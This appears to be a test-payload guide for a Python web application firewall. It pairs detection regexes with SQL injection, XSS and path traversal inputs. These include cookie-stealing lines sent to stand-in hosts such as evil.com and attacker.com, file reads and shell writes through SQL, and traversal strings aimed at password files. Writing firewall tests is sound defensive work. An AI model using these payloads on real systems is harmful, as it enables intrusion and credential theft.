# PyWAF Attack Payloads Test Suite

This document contains actual attack payloads that should be detected and blocked by PyWAF. Each payload corresponds to patterns defined in `config/waf_rules.json`.

---

## 📋 Table of Contents

- [SQL Injection Payloads](#sql-injection-payloads)
- [XSS (Cross-Site Scripting) Payloads](#xss-cross-site-scripting-payloads)
- [Path Traversal Payloads](#path-traversal-payloads)
- [Combined/Advanced Attacks](#combinedadvanced-attack-payloads)
- [Clean/Safe Payloads](#cleansafe-payloads)
- [Usage Instructions](#usage-instructions)

---

## 🛡️ SQL Injection Payloads

### Pattern: `(?:')\\s*or\\s*1\\s*=\\s*1`
**What it detects:** Classic SQL injection logic bypass

```sql
admin' or 1=1
admin' OR 1=1
admin' or 1 = 1
user' or 1=1--
' or 1=1#
```

### Pattern: `(?:union)\\s+(?:select)`
**What it detects:** SQL UNION-based injection

```sql
1 UNION SELECT * FROM users
1 union select username,password from accounts
' UNION SELECT NULL,NULL,NULL--
id=1 UNION SELECT database(),user()
```

### Pattern: `select\\s+.+\\s+from\\s+`
**What it detects:** Direct SELECT statements

```sql
SELECT * FROM users
select id,name from customers
SELECT password FROM admin WHERE id=1
```

### Pattern: `information_schema`
**What it detects:** Database metadata extraction

```sql
SELECT table_name FROM information_schema.tables
' UNION SELECT * FROM information_schema.columns--
SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS
```

### Pattern: `load_file\\s*\\(`
**What it detects:** File reading via SQL

```sql
' UNION SELECT load_file('/etc/passwd')--
SELECT load_file('c:\\boot.ini')
load_file('/var/www/config.php')
```

### Pattern: `benchmark\\s*\\(`
**What it detects:** Time-based blind SQL injection

```sql
' AND benchmark(10000000,MD5('test'))--
SELECT benchmark(1000000, SHA1('attack'))
benchmark(5000000, ENCODE('msg','key'))
```

### Pattern: `sleep\\s*\\(`
**What it detects:** Time delay attacks

```sql
' AND sleep(5)--
SELECT sleep(10)
'; waitfor delay '00:00:05'--
sleep(3)
```

### Pattern: `outfile`
**What it detects:** File writing via SQL

```sql
' INTO OUTFILE '/tmp/output.txt'--
SELECT * FROM users INTO outfile '/var/www/dump.txt'
```

### Pattern: `concat\\s*\\(`
**What it detects:** String concatenation in injection

```sql
' UNION SELECT concat(username,':',password) FROM users--
SELECT concat('admin',0x3a,password) FROM accounts
concat(first_name,' ',last_name)
```

### Pattern: `into\\s+outfile`
**What it detects:** Alternative file writing syntax

```sql
SELECT * INTO outfile '/tmp/data.txt'
' UNION SELECT NULL INTO OUTFILE '/var/www/shell.php'--
```

---

## 🎯 XSS (Cross-Site Scripting) Payloads

### Pattern: `(?i)<script[^>]*>.*?</script>`
**What it detects:** Script tag injection

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<ScRiPt>alert('bypass')</ScRiPt>
<script src="http://evil.com/xss.js"></script>
<script type="text/javascript">alert(document.cookie)</script>
```

### Pattern: `(?i)javascript\\s*:`
**What it detects:** JavaScript protocol in URLs

```html
<a href="javascript:alert('XSS')">Click</a>
<img src="javascript:alert(1)">
<iframe src="javascript:alert(document.cookie)"></iframe>
javascript:void(alert('XSS'))
```

### Pattern: `(?i)on\\w+\\s*=\\s*['\"]?[^'\"]*['\"]?`
**What it detects:** Event handler attributes

```html
<img src=x onerror=alert(1)>
<body onload=alert('XSS')>
<input onfocus=alert(document.cookie)>
<svg onload=alert(1)>
<div onmouseover="alert('XSS')">
<img src=x onclick=alert(1)>
<input type="text" onchange="alert('XSS')">
```

### Pattern: `(?i)<iframe[^>]*>`
**What it detects:** Iframe injection

```html
<iframe src="http://evil.com"></iframe>
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<IFRAME SRC="javascript:alert(1)"></IFRAME>
```

### Pattern: `(?i)<object[^>]*>`
**What it detects:** Object tag exploitation

```html
<object data="http://evil.com/malware.swf"></object>
<object data="data:text/html,<script>alert(1)</script>"></object>
```

### Pattern: `(?i)<embed[^>]*>`
**What it detects:** Embed tag exploitation

```html
<embed src="http://evil.com/xss.swf">
<embed src="data:text/html,<script>alert(1)</script>">
```

### Pattern: `(?i)eval\\s*\\(`
**What it detects:** Dynamic code execution

```javascript
<script>eval('alert(1)')</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
eval('document.location="http://evil.com"')
```

### Pattern: `(?i)alert\\s*\\(`
**What it detects:** Alert function calls

```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
alert(document.cookie)
<svg onload=alert('XSS')>
<body onload="alert('XSS')">
```

### Pattern: `(?i)document\\.cookie`
**What it detects:** Cookie theft attempts

```javascript
<script>alert(document.cookie)</script>
<img src=x onerror=alert(document.cookie)>
fetch('http://evil.com?cookie='+document.cookie)
new Image().src='http://evil.com/steal?c='+document.cookie
```

### Pattern: `(?i)document\\.write`
**What it detects:** DOM manipulation via document.write

```javascript
<script>document.write('<img src=x onerror=alert(1)>')</script>
document.write(unescape('%3Cscript%3Ealert(1)%3C/script%3E'))
```

### Pattern: `(?i)window\\.location`
**What it detects:** Redirection attacks

```javascript
<script>window.location='http://evil.com'</script>
<img src=x onerror="window.location='http://phishing.com'">
window.location.href='http://attacker.com?cookie='+document.cookie
```

### Pattern: `(?i)<img[^>]*onerror`
**What it detects:** Image tag with onerror handler

```html
<img src=x onerror=alert(1)>
<img src=invalid onerror="alert('XSS')">
<IMG SRC=x ONERROR=alert(document.cookie)>
<img src="" onerror="eval(atob('YWxlcnQoMSk='))">
```

### Pattern: `(?i)<svg[^>]*onload`
**What it detects:** SVG tag with onload handler

```html
<svg onload=alert(1)>
<svg onload="alert('XSS')">
<SVG ONLOAD=alert(document.cookie)>
<svg/onload=alert(1)>
```

### Pattern: `(?i)expression\\s*\\(`
**What it detects:** CSS expression injection (IE)

```html
<div style="background:expression(alert('XSS'))">
<style>body{background:expression(alert(1))}</style>
```

### Pattern: `(?i)vbscript\\s*:`
**What it detects:** VBScript protocol (IE)

```html
<img src="vbscript:msgbox('XSS')">
<a href="vbscript:alert('XSS')">Click</a>
```

### Pattern: `(?i)data\\s*:\\s*text/html`
**What it detects:** Data URI with HTML content

```html
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<object data="data:text/html,<script>alert('XSS')</script>"></object>
<embed src="data:text/html,<body onload=alert(1)>">
```

---

## 📁 Path Traversal Payloads

### Pattern: `(?i)\\.\\.\\/`
**What it detects:** Unix-style directory traversal

```
../etc/passwd
../../../../etc/passwd
../../windows/system32/config/sam
../../../boot.ini
../../../../../../../../etc/shadow
```

### Pattern: `(?i)\\.\\.\\\\`
**What it detects:** Windows-style directory traversal

```
..\\windows\\system32\\config\\sam
..\\..\\..\\boot.ini
..\\..\\..\\..\\etc\\passwd
..\\..\\windows\\win.ini
```

### Pattern: `(?i)%2e%2e[\\/]`
**What it detects:** URL-encoded traversal (single encoding)

```
%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e\\windows\\system32
```

### Pattern: `(?i)%252e%252e`
**What it detects:** Double URL-encoded traversal

```
%252e%252e/etc/passwd
%252e%252e%252f%252e%252e%252fetc%252fshadow
```

### Pattern: `(?i)\\.\\.\\/.*etc\\/passwd`
**What it detects:** Direct /etc/passwd access

```
../etc/passwd
../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
```

### Pattern: `(?i)etc\\/shadow`
**What it detects:** Shadow password file access

```
/etc/shadow
../etc/shadow
../../../../etc/shadow
```

### Pattern: `(?i)windows[\\/]system32`
**What it detects:** Windows system directory access

```
c:\windows\system32\config\sam
../windows/system32/drivers/etc/hosts
..\\..\\windows\\system32\\cmd.exe
```

### Pattern: `(?i)boot\\.ini`
**What it detects:** Windows boot configuration access

```
c:\boot.ini
../../../boot.ini
..\\..\\boot.ini
```

### Pattern: `(?i)win\\.ini`
**What it detects:** Windows configuration file access

```
c:\windows\win.ini
../windows/win.ini
..\\..\\windows\\win.ini
```

### Pattern: `(?i)%00`
**What it detects:** Null byte injection

```
/etc/passwd%00.jpg
../../../etc/passwd%00
../../boot.ini%00.txt
```

### Pattern: `(?i)\\/proc\\/self`
**What it detects:** Linux process information access

```
/proc/self/environ
../../../proc/self/cmdline
/proc/self/fd/0
```

### Pattern: `(?i)c:\\\\windows`
**What it detects:** Direct Windows path access

```
c:\\windows\\system32\\config\\sam
c:\\windows\\win.ini
file:///c:\\windows\\system32\\drivers\\etc\\hosts
```

### Pattern: `(?i)[\\/]etc[\\/](?:passwd|shadow|hosts)`
**What it detects:** Critical Unix system file access

```
/etc/passwd
/etc/shadow
/etc/hosts
../../../etc/passwd
../../../../etc/shadow
../../etc/hosts
```

---

## 🔥 Combined/Advanced Attack Payloads

### SQL Injection + XSS
```sql
<script>alert('XSS')</script>' OR 1=1--
1' UNION SELECT '<script>alert(1)</script>',NULL--
```

### Path Traversal + Null Byte
```
../../../../etc/passwd%00.jpg
../../boot.ini%00.txt
```

### Encoded XSS
```
%3Cscript%3Ealert(1)%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### Obfuscated SQL Injection
```sql
admin'/**/or/**/1=1--
admin'/*comment*/union/*comment*/select/**/1,2,3--
```

### Case Variation Bypass Attempts
```html
<ScRiPt>alert(1)</ScRiPt>
SeLeCt * FrOm users
UNION SELECT * FROM information_schema.tables
```

---

## ✅ Clean/Safe Payloads

These should **NOT** be blocked by the WAF:

### Normal Queries
```
search=python programming
user=john_doe
email=test@example.com
name=Alice Smith
comment=This is a great product!
```

### Normal Paths
```
/api/users
/images/photo.jpg
/documents/report.pdf
/static/css/style.css
```

### Normal JavaScript (in proper context)
```javascript
function calculate() { return 1 + 1; }
var message = "Hello World";
```

---

## 🧪 Usage Instructions

### Manual Testing

1. **Copy a payload** from the sections above
2. **Paste into your application** (search box, login form, file download parameter, etc.)
3. **Expected Result**: WAF should BLOCK the request with HTTP 403
4. **Check logs**: `logs/waf.log` for detection details

**Example:**
```
URL: http://localhost:5000/search?q=<script>alert(1)</script>
Expected Response: 403 Forbidden - XSS Attack Detected
```

### Automated Testing

Run the automated test suite:

```bash
# Activate virtual environment
.\venv\Scripts\Activate.ps1

# Run from project root
python -m tests.test_waf_patterns
```

### Verification Checklist

- [ ] All SQL injection patterns detected
- [ ] All XSS patterns detected
- [ ] All path traversal patterns detected
- [ ] Clean payloads allowed through
- [ ] Logs contain detection details
- [ ] HTTP 403 responses for blocked requests

---

## 📊 Pattern Coverage Statistics

| Attack Type | Patterns in Config | Test Payloads |
|-------------|-------------------|---------------|
| SQL Injection | 10 | 40+ |
| XSS | 17 | 60+ |
| Path Traversal | 13 | 35+ |
| **Total** | **40** | **135+** |

---

## 🔐 Security Notes

1. **Defense-in-Depth**: WAF uses both hardcoded patterns AND config patterns
2. **Case-Insensitive**: Most patterns use `(?i)` flag for case insensitivity
3. **Evasion Resistance**: Detects URL encoding, HTML encoding, Unicode, obfuscation
4. **Performance**: Patterns are pre-compiled and cached for speed

---

## 📝 Adding Custom Payloads

To test a new attack pattern:

1. Add the regex pattern to `config/waf_rules.json`
2. Add corresponding test payload to this document
3. Run tests to verify detection
4. Update pattern coverage statistics
